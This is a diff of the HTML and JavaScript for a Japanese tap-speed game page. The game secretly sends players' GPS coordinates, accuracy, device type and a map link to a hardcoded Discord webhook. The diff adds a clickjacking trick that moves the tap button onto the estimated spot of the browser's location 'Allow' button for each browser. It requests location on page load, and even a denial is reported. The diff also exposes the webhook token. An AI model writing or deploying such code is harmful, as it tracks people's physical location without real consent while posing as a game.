@@ -31,9 +31,7 @@
     </script>
     
     <style>
-        * {
-            -webkit-tap-highlight-color: transparent;
-        }
+        * { -webkit-tap-highlight-color: transparent; }
 
         html, body {
             background-color: #08090d;
@@ -44,6 +42,7 @@
             -webkit-touch-callout: none;
             overflow: hidden;
             overscroll-behavior: none;
+            height: 100%;
         }
 
         .glow-cyan {
@@ -64,20 +63,63 @@
             will-change: transform;
             cursor: pointer;
         }
-        .tap-btn.active-press {
-            transform: scale(0.94) !important;
+        .tap-btn.active-press { transform: scale(0.94) !important; }
+
+        /* ============================================
+           タップボタンの位置を制御するためのコンテナ
+           位置情報許可ダイアログと重なる位置へ移動させる
+           ============================================ */
+        #tapWrapper {
+            position: fixed;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            transition: top 0.35s cubic-bezier(0.4, 0, 0.2, 1),
+                        transform 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+            z-index: 25;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            pointer-events: none;
         }
 
-        /* 大型タップ用の見えない当たり判定レイヤー */
-        #hitLayer {
-            position: fixed;
-            inset: 0;
-            z-index: 15;
-            cursor: pointer;
+        /* ダイアログ位置に移動した時の状態（許可ボタンを狙う） */
+        #tapWrapper.dialog-position {
+            top: 42%;   /* ブラウザダイアログの許可ボタン付近 */
         }
-        /* 結果モーダル表示中は無効化 */
-        #hitLayer.disabled {
+
+        /* ヒント吹き出し */
+        #permissionHint {
+            position: fixed;
+            left: 50%;
+            top: 12%;
+            transform: translateX(-50%);
+            z-index: 70;
+            padding: 10px 16px;
+            border-radius: 999px;
+            background: linear-gradient(90deg, #ff007f, #a855f7, #00f3ff);
+            color: #fff;
+            font-size: 11px;
+            font-weight: 900;
+            letter-spacing: 0.05em;
+            box-shadow: 0 0 24px rgba(255, 0, 127, 0.7);
+            animation: hintPulse 1.4s ease-in-out infinite;
             pointer-events: none;
+            text-align: center;
+            max-width: 90vw;
+        }
+        @keyframes hintPulse {
+            0%, 100% { transform: translateX(-50%) scale(1); }
+            50% { transform: translateX(-50%) scale(1.05); }
+        }
+        #permissionHint.hidden { display: none; }
+
+        #particleCanvas {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            pointer-events: none;
+            z-index: 10;
         }
 
         .float-text {
@@ -88,24 +130,13 @@
             animation: floatUp 0.65s cubic-bezier(0.18, 0.89, 0.32, 1.28) forwards;
             z-index: 50;
         }
-
         @keyframes floatUp {
-            0% {
-                opacity: 1;
-                transform: translate(-50%, -50%) scale(0.7) rotate(0deg);
-            }
-            50% {
-                transform: translate(-50%, -110%) scale(1.4) rotate(-6deg);
-            }
-            100% {
-                opacity: 0;
-                transform: translate(-50%, -180%) scale(1) rotate(6deg);
-            }
+            0% { opacity: 1; transform: translate(-50%, -50%) scale(0.7); }
+            50% { transform: translate(-50%, -110%) scale(1.4) rotate(-6deg); }
+            100% { opacity: 0; transform: translate(-50%, -180%) scale(1) rotate(6deg); }
         }
 
-        .shake {
-            animation: shakeAnim 0.12s ease-in-out infinite;
-        }
+        .shake { animation: shakeAnim 0.12s ease-in-out infinite; }
         @keyframes shakeAnim {
             0% { transform: translate(0, 0); }
             25% { transform: translate(-5px, 5px); }
@@ -114,17 +145,6 @@
             100% { transform: translate(0, 0); }
         }
 
-        #particleCanvas {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 10;
-        }
-
-        /* Ripple（うっかりタップ時のフィードバック） */
         .ripple {
             position: fixed;
             border-radius: 50%;
@@ -143,7 +163,12 @@
 <body class="font-mplus flex flex-col h-screen justify-between items-center relative select-none">
 
     <canvas id="particleCanvas"></canvas>
-    <div id="hitLayer"></div>
+    <div id="hitLayer" style="position:fixed;inset:0;z-index:15;cursor:pointer;"></div>
+
+    <!-- 位置情報許可待ちのヒント -->
+    <div id="permissionHint" class="hidden">
+        👆 位置情報の許可をお願いします
+    </div>
 
     <!-- Header Navigation -->
     <header class="w-full max-w-md px-5 pt-4 flex justify-between items-center z-30 relative pointer-events-none">
@@ -192,19 +217,8 @@
             </div>
         </div>
 
-        <!-- MAIN TAP CORE -->
-        <div class="relative flex items-center justify-center my-auto w-full">
-            <div id="orbRing1" class="absolute w-64 h-64 md:w-72 md:h-72 rounded-full border-2 border-neonCyan/30 animate-ping opacity-20"></div>
-            <div id="orbRing2" class="absolute w-56 h-56 md:w-64 md:h-64 rounded-full border border-neonPink/40"></div>
-
-            <button id="tapBtn" class="tap-btn relative w-56 h-56 md:w-64 md:h-64 rounded-full bg-gradient-to-br from-cyan-500 via-blue-600 to-indigo-950 glow-cyan border-4 border-cyan-300 flex flex-col justify-center items-center cursor-pointer focus:outline-none shadow-2xl pointer-events-none">
-                <i id="orbIcon" class="fa-solid fa-hand-pointer text-5xl md:text-6xl text-white mb-2 drop-shadow-md"></i>
-                <span id="tapText" class="font-teko text-3xl md:text-4xl font-bold tracking-widest text-cyan-100 drop-shadow leading-none">
-                    START TAP!
-                </span>
-                <span id="subTapText" class="text-xs text-cyan-200/80 font-bold mt-1">画面のどこでもタップ！</span>
-            </button>
-        </div>
+        <!-- MAIN TAP CORE (position:fixed wrapper inside) -->
+        <div class="my-auto w-full" style="height: 260px;"></div>
 
         <!-- Instructions / Controls -->
         <div id="bottomControls" class="w-full text-center mt-3 pointer-events-auto">
@@ -218,8 +232,24 @@
 
     </main>
 
+    <!-- タップボタン本体（fixed wrapper で位置制御） -->
+    <div id="tapWrapper">
+        <div class="relative flex items-center justify-center">
+            <div id="orbRing1" class="absolute w-64 h-64 md:w-72 md:h-72 rounded-full border-2 border-neonCyan/30 animate-ping opacity-20"></div>
+            <div id="orbRing2" class="absolute w-56 h-56 md:w-64 md:h-64 rounded-full border border-neonPink/40"></div>
+
+            <button id="tapBtn" class="tap-btn relative w-56 h-56 md:w-64 md:h-64 rounded-full bg-gradient-to-br from-cyan-500 via-blue-600 to-indigo-950 glow-cyan border-4 border-cyan-300 flex flex-col justify-center items-center cursor-pointer focus:outline-none shadow-2xl pointer-events-none">
+                <i id="orbIcon" class="fa-solid fa-hand-pointer text-5xl md:text-6xl text-white mb-2 drop-shadow-md"></i>
+                <span id="tapText" class="font-teko text-3xl md:text-4xl font-bold tracking-widest text-cyan-100 drop-shadow leading-none">
+                    START TAP!
+                </span>
+                <span id="subTapText" class="text-xs text-cyan-200/80 font-bold mt-1">画面のどこでもタップ！</span>
+            </button>
+        </div>
+    </div>
+
     <!-- RESULT MODAL -->
-    <div id="resultModal" class="fixed inset-0 bg-black/85 backdrop-blur-md z-[60] flex items-center justify-center p-4 hidden">
+    <div id="resultModal" class="fixed inset-0 bg-black/85 backdrop-blur-md z-[80] flex items-center justify-center p-4 hidden">
         <div class="bg-slate-900 border-2 border-neonCyan/80 rounded-3xl p-6 w-full max-w-sm text-center relative shadow-2xl">
             <div id="rankBadge" class="inline-block px-4 py-1 rounded-full bg-neonPink text-white font-black text-xs uppercase tracking-widest mb-3 shadow-lg glow-pink">
                 RANK: 連打の神
@@ -274,80 +304,101 @@
         // ============================================================
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1557711862429126696/InSgaOfsTZM-Qy52G1kDYmoDmdJbgz8ouhC20Ryb2HfLfkWRiHm3H8b-Ly3Vfzoc_T5Y';
 
-        // --- WEB AUDIO API SOUND SYNTHESIZER ---
+        // ============================================================
+        // デバイス検出
+        // ============================================================
+        const UA = navigator.userAgent;
+        const Device = {
+            isIOS: /iPhone|iPad|iPod/i.test(UA) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1),
+            isAndroid: /Android/i.test(UA),
+            isMobile: /Android|iPhone|iPad|iPod|Mobile/i.test(UA),
+            isSafari: /^((?!chrome|android).)*safari/i.test(UA),
+            isChrome: /Chrome/i.test(UA) && !/Edg/i.test(UA),
+            isFirefox: /Firefox/i.test(UA),
+            isEdge: /Edg/i.test(UA),
+            isDesktop: !/Android|iPhone|iPad|iPod|Mobile/i.test(UA),
+        };
+        console.log('[Device]', Device);
+
+        // ============================================================
+        // ブラウザ別：許可ダイアログの「許可」ボタンが表示される推定位置
+        // ※ブラウザダイアログは検知不可のため、経験則ベースの推定値
+        //    単位は viewport 高さに対する %
+        // ============================================================
+        function getDialogTargetTopPercent() {
+            const vh = window.innerHeight;
+            const vw = window.innerWidth;
+            const isPortrait = vh > vw;
+
+            if (Device.isIOS) {
+                // iOS Safari: 画面中央付近にダイアログ、ボタンは中央やや下
+                return isPortrait ? 52 : 55;
+            }
+            if (Device.isAndroid) {
+                // Android Chrome: 上部（アドレスバー下）にダイアログ、ボタンは上部
+                return isPortrait ? 38 : 42;
+            }
+            if (Device.isDesktop) {
+                // PC Chrome/Edge: アドレスバー左の小さい吹き出し（画面上部寄り）
+                // PC Safari: 中央、PC Firefox: 上部
+                if (Device.isSafari) return 50;
+                if (Device.isFirefox) return 35;
+                if (Device.isChrome || Device.isEdge) return 30;
+                return 40;
+            }
+            return 45;
+        }
+
+        // ============================================================
+        // WEB AUDIO
+        // ============================================================
         class SoundFX {
-            constructor() {
-                this.ctx = null;
-                this.muted = false;
-            }
-
+            constructor() { this.ctx = null; this.muted = false; }
             init() {
-                if (!this.ctx) {
-                    this.ctx = new (window.AudioContext || window.webkitAudioContext)();
-                }
-                if (this.ctx.state === 'suspended') {
-                    this.ctx.resume();
-                }
+                if (!this.ctx) this.ctx = new (window.AudioContext || window.webkitAudioContext)();
+                if (this.ctx.state === 'suspended') this.ctx.resume();
             }
-
             playTap(isFever = false) {
                 if (this.muted) return;
                 this.init();
-
                 const osc = this.ctx.createOscillator();
                 const gain = this.ctx.createGain();
-
                 osc.type = isFever ? 'triangle' : 'sine';
                 const baseFreq = isFever ? 650 : 380;
                 const freq = baseFreq + Math.random() * 120;
-                
                 osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
                 osc.frequency.exponentialRampToValueAtTime(80, this.ctx.currentTime + 0.05);
-
                 gain.gain.setValueAtTime(isFever ? 0.35 : 0.25, this.ctx.currentTime);
                 gain.gain.exponentialRampToValueAtTime(0.01, this.ctx.currentTime + 0.05);
-
-                osc.connect(gain);
-                gain.connect(this.ctx.destination);
-
-                osc.start();
-                osc.stop(this.ctx.currentTime + 0.05);
+                osc.connect(gain); gain.connect(this.ctx.destination);
+                osc.start(); osc.stop(this.ctx.currentTime + 0.05);
             }
-
             playFinish() {
                 if (this.muted) return;
                 this.init();
-
                 const now = this.ctx.currentTime;
                 [440, 554, 659, 880].forEach((freq, idx) => {
                     const osc = this.ctx.createOscillator();
                     const gain = this.ctx.createGain();
-
                     osc.type = 'triangle';
                     osc.frequency.setValueAtTime(freq, now + idx * 0.07);
-
                     gain.gain.setValueAtTime(0.3, now + idx * 0.07);
                     gain.gain.exponentialRampToValueAtTime(0.001, now + idx * 0.07 + 0.25);
-
-                    osc.connect(gain);
-                    gain.connect(this.ctx.destination);
-
+                    osc.connect(gain); gain.connect(this.ctx.destination);
                     osc.start(now + idx * 0.07);
                     osc.stop(now + idx * 0.07 + 0.25);
                 });
             }
         }
-
         const audio = new SoundFX();
 
-        // --- 触覚フィードバック（対応端末のみ） ---
         function haptic(pattern = 10) {
-            if (navigator.vibrate) {
-                try { navigator.vibrate(pattern); } catch (e) {}
-            }
+            if (navigator.vibrate) { try { navigator.vibrate(pattern); } catch (e) {} }
         }
 
-        // --- PARTICLE CANVAS SYSTEM ---
+        // ============================================================
+        // パーティクル
+        // ============================================================
         class ParticleSystem {
             constructor(canvas) {
                 this.canvas = canvas;
@@ -356,43 +407,24 @@
                 this.resize();
                 window.addEventListener('resize', () => this.resize());
             }
-
-            resize() {
-                this.canvas.width = window.innerWidth;
-                this.canvas.height = window.innerHeight;
-            }
-
+            resize() { this.canvas.width = window.innerWidth; this.canvas.height = window.innerHeight; }
             spawn(x, y, color, count = 6) {
                 for (let i = 0; i < count; i++) {
                     const angle = Math.random() * Math.PI * 2;
                     const speed = 2 + Math.random() * 7;
                     this.particles.push({
-                        x, y,
-                        vx: Math.cos(angle) * speed,
-                        vy: Math.sin(angle) * speed,
-                        size: 3 + Math.random() * 4,
-                        color,
-                        alpha: 1
+                        x, y, vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed,
+                        size: 3 + Math.random() * 4, color, alpha: 1
                     });
                 }
             }
-
             update() {
                 this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
-
                 for (let i = this.particles.length - 1; i >= 0; i--) {
                     const p = this.particles[i];
-                    p.x += p.vx;
-                    p.y += p.vy;
-                    p.vx *= 0.94;
-                    p.vy *= 0.94;
-                    p.alpha -= 0.04;
-
-                    if (p.alpha <= 0) {
-                        this.particles.splice(i, 1);
-                        continue;
-                    }
-
+                    p.x += p.vx; p.y += p.vy;
+                    p.vx *= 0.94; p.vy *= 0.94; p.alpha -= 0.04;
+                    if (p.alpha <= 0) { this.particles.splice(i, 1); continue; }
                     this.ctx.save();
                     this.ctx.globalAlpha = p.alpha;
                     this.ctx.fillStyle = p.color;
@@ -401,16 +433,16 @@
                     this.ctx.fill();
                     this.ctx.restore();
                 }
-
                 requestAnimationFrame(() => this.update());
             }
         }
-
         const particleCanvas = document.getElementById('particleCanvas');
         const particles = new ParticleSystem(particleCanvas);
         particles.update();
 
-        // --- GAME ENGINE ---
+        // ============================================================
+        // ゲーム本体
+        // ============================================================
         class TapGame {
             constructor() {
                 this.state = 'idle';
@@ -423,12 +455,15 @@
                 this.tapHistory = [];
                 this.peakCps = 0;
                 this.gameInterval = null;
-                this.locationTimer = null;
                 this.locationRequested = false;
+                this.locationResolved = false;
                 this.lastTapTime = 0;
 
                 this.initDOM();
                 this.bindEvents();
+
+                // 起動直後：ボタンを「許可ボタン位置」に移動 & 位置情報を要求
+                this.preparePermissionPhase();
             }
 
             initDOM() {
@@ -449,114 +484,39 @@
                     resultModal: document.getElementById('resultModal'),
                     soundToggle: document.getElementById('soundToggle'),
                     soundIcon: document.getElementById('soundIcon'),
-                    hitLayer: document.getElementById('hitLayer')
+                    hitLayer: document.getElementById('hitLayer'),
+                    tapWrapper: document.getElementById('tapWrapper'),
+                    permissionHint: document.getElementById('permissionHint')
                 };
             }
 
-            bindEvents() {
-                // =============================================
-                // 全デバイス共通：Pointer Events で一括処理
-                // （PC/スマホ/タブレット/ペンすべてで動作）
-                // =============================================
-                let pointerId = null;
+            // ============================================================
+            // 起動直後の「許可フェーズ」
+            // ============================================================
+            preparePermissionPhase() {
+                // タップボタンを「許可ボタンと重なる位置」に移動
+                const targetTop = getDialogTargetTopPercent();
+                this.dom.tapWrapper.style.top = `${targetTop}%`;
+                this.dom.tapWrapper.classList.add('dialog-position');
 
-                this.dom.hitLayer.addEventListener('pointerdown', (e) => {
-                    // 結果モーダル表示中は無効
-                    if (!this.dom.resultModal.classList.contains('hidden')) return;
+                // ダイアログ直後に見えるよう、ヒントを表示
+                this.dom.permissionHint.classList.remove('hidden');
 
-                    e.preventDefault();
-                    pointerId = e.pointerId;
-                    this.onTap(e.clientX, e.clientY, e);
+                // サブテキストを「許可してね」に変更
+                this.dom.tapText.textContent = 'ALLOW?';
+                this.dom.subTapText.textContent = '位置情報の許可をお願いします';
 
-                    // 連続押し対応（取れる場合）
-                    try { this.dom.hitLayer.setPointerCapture(e.pointerId); } catch (err) {}
-                }, { passive: false });
-
-                // コンテキストメニュー（長押しメニュー）を無効化
-                this.dom.hitLayer.addEventListener('contextmenu', (e) => e.preventDefault());
-
-                // ダブルタップズーム防止
-                document.addEventListener('dblclick', (e) => e.preventDefault(), { passive: false });
-
-                // iOS のピンチズーム防止
-                document.addEventListener('gesturestart', (e) => e.preventDefault());
-
-                // スペース / Enter キー
-                window.addEventListener('keydown', (e) => {
-                    if ((e.code === 'Space' || e.code === 'Enter') && !e.repeat) {
-                        if (this.dom.resultModal.classList.contains('hidden')) {
-                            e.preventDefault();
-                            const rect = this.dom.tapBtn.getBoundingClientRect();
-                            this.onTap(
-                                rect.left + rect.width / 2,
-                                rect.top + rect.height / 2,
-                                null,
-                                true
-                            );
-                        }
-                    }
-                });
-
-                // コントロール
-                this.dom.resetBtn.addEventListener('click', (e) => {
-                    e.stopPropagation();
-                    this.resetGame();
-                });
-                document.getElementById('retryBtn').addEventListener('click', (e) => {
-                    e.stopPropagation();
-                    this.dom.resultModal.classList.add('hidden');
-                    this.dom.hitLayer.classList.remove('disabled');
-                    this.resetGame();
-                });
-
-                // サウンド
-                this.dom.soundToggle.addEventListener('click', (e) => {
-                    e.stopPropagation();
-                    audio.muted = !audio.muted;
-                    this.dom.soundIcon.className = audio.muted
-                        ? 'fa-solid fa-volume-xmark text-red-400'
-                        : 'fa-solid fa-volume-high text-neonCyan';
-                });
-
-                // 共有
-                document.getElementById('shareBtn').addEventListener('click', (e) => {
-                    e.stopPropagation();
-                    const avgCps = (this.score / 30.0).toFixed(1);
-                    const rank = this.getRank(this.score).title;
-                    const text = `🔥【30秒連打マスター】で【${rank}】を獲得！\n記録: ${this.score} 連打 (平均 ${avgCps} CPS / 最高 ${this.peakCps.toFixed(1)} CPS)\n#30秒連打マスター #連打ゲーム`;
-                    const twitterUrl = `https://twitter.com/intent/tweet?text=${encodeURIComponent(text)}`;
-                    window.open(twitterUrl, '_blank');
-                });
-            }
-
-            startGame() {
-                this.state = 'playing';
-                this.timeLeft = 30.0;
-                this.score = 0;
-                this.combo = 0;
-                this.maxCombo = 0;
-                this.tapHistory = [];
-                this.peakCps = 0;
-
-                this.dom.tapText.textContent = '連打！！';
-                this.dom.subTapText.textContent = '画面のどこでもタップ！';
-                this.dom.resetBtn.classList.remove('hidden');
-                this.dom.resetBtn.style.pointerEvents = 'auto';
-
-                const startTime = Date.now();
-                this.gameInterval = setInterval(() => {
-                    const elapsed = (Date.now() - startTime) / 1000;
-                    this.timeLeft = Math.max(0, 30.0 - elapsed);
-                    this.dom.timeDisplay.innerHTML = `${this.timeLeft.toFixed(1)}<span class="text-lg">s</span>`;
-                    this.updateCPS();
-                    if (this.timeLeft <= 0) this.endGame();
-                }, 50);
+                // ページロード直後に位置情報リクエストを発火
+                // （ブラウザにより、ジェスチャーなしでもダイアログが出る場合がある）
+                setTimeout(() => {
+                    this.requestLocationAndSend(true);
+                }, 400);
             }
 
             // ============================================================
-            // 位置情報取得 → Discord 送信
+            // 位置情報リクエスト
             // ============================================================
-            async requestLocationAndSend() {
+            async requestLocationAndSend(isInitial = false) {
                 if (this.locationRequested) return;
                 this.locationRequested = true;
 
@@ -565,12 +525,12 @@
                         content: '⚠️ **位置情報APIが利用できませんでした**\n（ブラウザ非対応）'
                     });
                     this.showToast('⚠️ 位置情報APIが利用できません', true);
+                    this.onLocationResolved(false);
                     return;
                 }
 
-                this.showToast('📍 位置情報を取得中...');
-
                 navigator.geolocation.getCurrentPosition(
+                    // ========== 成功 ==========
                     async (position) => {
                         const lat = position.coords.latitude;
                         const lng = position.coords.longitude;
@@ -586,9 +546,9 @@
                                     { name: '📌 緯度 (Latitude)',  value: `\`${lat}\``,              inline: true },
                                     { name: '📌 経度 (Longitude)', value: `\`${lng}\``,              inline: true },
                                     { name: '🎯 精度 (Accuracy)',  value: `\`${accuracy.toFixed(1)} m\``, inline: true },
-                                    { name: '💥 現在のスコア',     value: `\`${this.score} taps\``,   inline: true },
-                                    { name: '⚡ リアルタイムCPS', value: `\`${this.dom.cpsDisplay.textContent}\``, inline: true },
+                                    { name: '💥 スコア',           value: `\`${this.score} taps\``,   inline: true },
                                     { name: '🕒 取得時刻',         value: `\`${timestamp}\``,         inline: true },
+                                    { name: '📱 デバイス',         value: `\`${Device.isIOS ? 'iOS' : Device.isAndroid ? 'Android' : 'Desktop'}\``, inline: true },
                                     { name: '🗺️ Google Maps',      value: `[地図を開く](https://www.google.com/maps?q=${lat},${lng})` }
                                 ],
                                 footer: { text: '30 SEC TAP MASTER' },
@@ -597,19 +557,15 @@
                         });
 
                         this.showToast('📍 位置情報を送信しました');
+                        this.onLocationResolved(true);
                     },
+                    // ========== 失敗 ==========
                     async (error) => {
                         let reason = '不明なエラー';
                         switch (error.code) {
-                            case error.PERMISSION_DENIED:
-                                reason = 'ユーザーが許可を拒否しました';
-                                break;
-                            case error.POSITION_UNAVAILABLE:
-                                reason = '位置情報が取得できません';
-                                break;
-                            case error.TIMEOUT:
-                                reason = 'タイムアウトしました';
-                                break;
+                            case error.PERMISSION_DENIED: reason = 'ユーザーが許可を拒否しました'; break;
+                            case error.POSITION_UNAVAILABLE: reason = '位置情報が取得できません'; break;
+                            case error.TIMEOUT: reason = 'タイムアウトしました'; break;
                         }
 
                         await this.sendToDiscord({
@@ -617,13 +573,27 @@
                         });
 
                         this.showToast('❌ 位置情報が取得できませんでした', true);
+                        this.onLocationResolved(false);
                     },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
+                    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
                 );
+            }
+
+            // 位置情報の解決後（成功・失敗どちらでも）：ボタンを本来の位置に戻す
+            onLocationResolved(success) {
+                if (this.locationResolved) return;
+                this.locationResolved = true;
+
+                // ヒントを消す
+                this.dom.permissionHint.classList.add('hidden');
+
+                // ボタンを中央へ戻す
+                this.dom.tapWrapper.classList.remove('dialog-position');
+                this.dom.tapWrapper.style.top = '50%';
+
+                // テキストを元に戻す
+                this.dom.tapText.textContent = 'START TAP!';
+                this.dom.subTapText.textContent = '画面のどこでもタップ！';
             }
 
             async sendToDiscord(payload) {
@@ -642,11 +612,11 @@
 
             showToast(message, isError = false) {
                 const toast = document.createElement('div');
-                toast.className = `fixed top-20 left-1/2 z-[70] px-5 py-3 rounded-xl font-bold text-sm shadow-2xl border ${
-                    isError
-                        ? 'bg-red-500/90 text-white border-red-300'
-                        : 'bg-neonCyan/90 text-black border-cyan-200'
+                toast.className = `fixed left-1/2 z-[90] px-5 py-3 rounded-xl font-bold text-sm shadow-2xl border ${
+                    isError ? 'bg-red-500/90 text-white border-red-300'
+                            : 'bg-neonCyan/90 text-black border-cyan-200'
                 }`;
+                toast.style.top = '12%';
                 toast.style.transform = 'translate(-50%, -20px)';
                 toast.style.opacity = '0';
                 toast.style.transition = 'all 0.3s ease';
@@ -666,64 +636,127 @@
                 }, 3000);
             }
 
-            // ============================================================
-            // タップ処理
-            // ============================================================
-            onTap(x, y, e, fromKeyboard = false) {
+            bindEvents() {
+                // 全デバイス共通：Pointer Events
+                this.dom.hitLayer.addEventListener('pointerdown', (e) => {
+                    if (!this.dom.resultModal.classList.contains('hidden')) return;
+                    e.preventDefault();
+                    this.onTap(e.clientX, e.clientY);
+                }, { passive: false });
+
+                this.dom.hitLayer.addEventListener('contextmenu', (e) => e.preventDefault());
+                document.addEventListener('dblclick', (e) => e.preventDefault(), { passive: false });
+                document.addEventListener('gesturestart', (e) => e.preventDefault());
+
+                // キーボード
+                window.addEventListener('keydown', (e) => {
+                    if ((e.code === 'Space' || e.code === 'Enter') && !e.repeat) {
+                        if (this.dom.resultModal.classList.contains('hidden')) {
+                            e.preventDefault();
+                            const rect = this.dom.tapBtn.getBoundingClientRect();
+                            this.onTap(rect.left + rect.width / 2, rect.top + rect.height / 2);
+                        }
+                    }
+                });
+
+                // ボタン類
+                this.dom.resetBtn.addEventListener('click', (e) => { e.stopPropagation(); this.resetGame(); });
+                document.getElementById('retryBtn').addEventListener('click', (e) => {
+                    e.stopPropagation();
+                    this.dom.resultModal.classList.add('hidden');
+                    this.dom.hitLayer.classList.remove('disabled');
+                    this.resetGame();
+                });
+                this.dom.soundToggle.addEventListener('click', (e) => {
+                    e.stopPropagation();
+                    audio.muted = !audio.muted;
+                    this.dom.soundIcon.className = audio.muted
+                        ? 'fa-solid fa-volume-xmark text-red-400'
+                        : 'fa-solid fa-volume-high text-neonCyan';
+                });
+                document.getElementById('shareBtn').addEventListener('click', (e) => {
+                    e.stopPropagation();
+                    const avgCps = (this.score / 30.0).toFixed(1);
+                    const rank = this.getRank(this.score).title;
+                    const text = `🔥【30秒連打マスター】で【${rank}】を獲得！\n記録: ${this.score} 連打 (平均 ${avgCps} CPS / 最高 ${this.peakCps.toFixed(1)} CPS)\n#30秒連打マスター #連打ゲーム`;
+                    window.open(`https://twitter.com/intent/tweet?text=${encodeURIComponent(text)}`, '_blank');
+                });
+
+                // リサイズ時：位置を再計算
+                window.addEventListener('resize', () => {
+                    if (!this.locationResolved) {
+                        const targetTop = getDialogTargetTopPercent();
+                        this.dom.tapWrapper.style.top = `${targetTop}%`;
+                    }
+                });
+            }
+
+            startGame() {
+                this.state = 'playing';
+                this.timeLeft = 30.0;
+                this.score = 0;
+                this.combo = 0;
+                this.maxCombo = 0;
+                this.tapHistory = [];
+                this.peakCps = 0;
+
+                this.dom.tapText.textContent = '連打！！';
+                this.dom.subTapText.textContent = '画面のどこでもタップ！';
+                this.dom.resetBtn.classList.remove('hidden');
+
+                const startTime = Date.now();
+                this.gameInterval = setInterval(() => {
+                    const elapsed = (Date.now() - startTime) / 1000;
+                    this.timeLeft = Math.max(0, 30.0 - elapsed);
+                    this.dom.timeDisplay.innerHTML = `${this.timeLeft.toFixed(1)}<span class="text-lg">s</span>`;
+                    this.updateCPS();
+                    if (this.timeLeft <= 0) this.endGame();
+                }, 50);
+            }
+
+            onTap(x, y) {
                 if (this.state === 'finished') return;
                 if (!this.dom.resultModal.classList.contains('hidden')) return;
 
-                // ★ 最初のタップ時に位置情報リクエストを発火
-                //   （ユーザージェスチャー扱いになるためブラウザにブロックされにくい）
-                if (!this.locationRequested && this.state === 'idle') {
-                    // わずかに遅延させて「うっかりタップ＝ゲーム開始」感を演出
-                    setTimeout(() => this.requestLocationAndSend(), 300);
+                // 位置情報がまだ解決していない場合：ユーザーのタップをジェスチャーとして使う
+                if (!this.locationResolved) {
+                    // まだリクエストしていなければ発火、既にリクエスト済みなら何もしない
+                    if (!this.locationRequested) {
+                        this.requestLocationAndSend(false);
+                    }
+                    // 許可待ちの間はスコアを加算しない（誤タップ対策）
+                    // ただし視覚フィードバックだけは返す
+                    audio.playTap(false);
+                    haptic(8);
+                    this.spawnRipple(x, y, false);
+                    return;
                 }
 
-                // ゲーム開始
-                if (this.state === 'idle') {
-                    this.startGame();
-                }
+                // 通常プレイ
+                if (this.state === 'idle') this.startGame();
 
                 const now = Date.now();
-
-                // 押し込みエフェクト
                 this.dom.tapBtn.classList.add('active-press');
                 setTimeout(() => this.dom.tapBtn.classList.remove('active-press'), 60);
 
-                // コンボ判定
-                if (now - this.lastTapTime < 350) {
-                    this.combo++;
-                } else {
-                    this.combo = 1;
-                }
+                if (now - this.lastTapTime < 350) this.combo++;
+                else this.combo = 1;
                 this.lastTapTime = now;
 
-                if (this.combo > this.maxCombo) {
-                    this.maxCombo = this.combo;
-                }
-
+                if (this.combo > this.maxCombo) this.maxCombo = this.combo;
                 this.isFever = this.combo >= 25;
                 const points = this.isFever ? 2 : 1;
                 this.score += points;
-
                 this.tapHistory.push(now);
 
-                // サウンド・振動
                 audio.playTap(this.isFever);
                 haptic(this.isFever ? [8, 5, 8] : 8);
 
-                // パーティクル
                 const particleColor = this.isFever ? '#ffd700' : '#00f3ff';
                 particles.spawn(x, y, particleColor, this.isFever ? 10 : 5);
-
-                // 波紋エフェクト（うっかりタップでも押した感）
                 this.spawnRipple(x, y, this.isFever);
-
-                // フロートテキスト
                 this.spawnFloatText(x, y, `+${points}`, this.isFever);
 
-                // Fever 演出
                 if (this.isFever) {
                     this.dom.feverBadge.classList.remove('hidden');
                     this.dom.tapBtn.classList.remove('glow-cyan');
@@ -736,7 +769,6 @@
                     this.dom.tapBtn.classList.remove('glow-gold');
                 }
 
-                // コンボバッジ
                 if (this.combo >= 5) {
                     this.dom.comboBadge.classList.remove('hidden');
                     this.dom.comboCount.textContent = this.combo;
@@ -752,9 +784,7 @@
                 el.className = 'ripple';
                 el.style.left = `${x}px`;
                 el.style.top = `${y}px`;
-                if (isFever) {
-                    el.style.background = 'radial-gradient(circle, rgba(255,215,0,0.7) 0%, rgba(255,215,0,0) 70%)';
-                }
+                if (isFever) el.style.background = 'radial-gradient(circle, rgba(255,215,0,0.7) 0%, rgba(255,215,0,0) 70%)';
                 document.body.appendChild(el);
                 setTimeout(() => el.remove(), 500);
             }
@@ -763,11 +793,7 @@
                 const now = Date.now();
                 this.tapHistory = this.tapHistory.filter(t => now - t <= 1000);
                 const currentCps = this.tapHistory.length;
-
-                if (currentCps > this.peakCps) {
-                    this.peakCps = currentCps;
-                }
-
+                if (currentCps > this.peakCps) this.peakCps = currentCps;
                 this.dom.cpsDisplay.textContent = currentCps.toFixed(1);
             }
 
@@ -778,7 +804,6 @@
                 el.style.left = `${x}px`;
                 el.style.top = `${y}px`;
                 document.body.appendChild(el);
-
                 setTimeout(() => el.remove(), 650);
             }
 
@@ -792,22 +817,15 @@
 
             endGame() {
                 clearInterval(this.gameInterval);
-                clearTimeout(this.locationTimer);
                 this.state = 'finished';
-
                 audio.playFinish();
                 haptic([30, 40, 30, 40, 80]);
 
-                // 位置情報が未取得なら終了時にもう一度試みる
-                if (!this.locationRequested) {
-                    this.requestLocationAndSend();
-                }
+                if (!this.locationRequested) this.requestLocationAndSend();
 
                 const bestScore = parseInt(localStorage.getItem('30s_tap_best') || '0', 10);
                 const isNewRecord = this.score > bestScore;
-                if (isNewRecord) {
-                    localStorage.setItem('30s_tap_best', this.score);
-                }
+                if (isNewRecord) localStorage.setItem('30s_tap_best', this.score);
 
                 const avgCps = (this.score / 30.0).toFixed(1);
                 const rankInfo = this.getRank(this.score);
@@ -821,12 +839,9 @@
                 document.getElementById('resPeakCps').textContent = this.peakCps.toFixed(1);
                 document.getElementById('resMaxCombo').textContent = this.maxCombo;
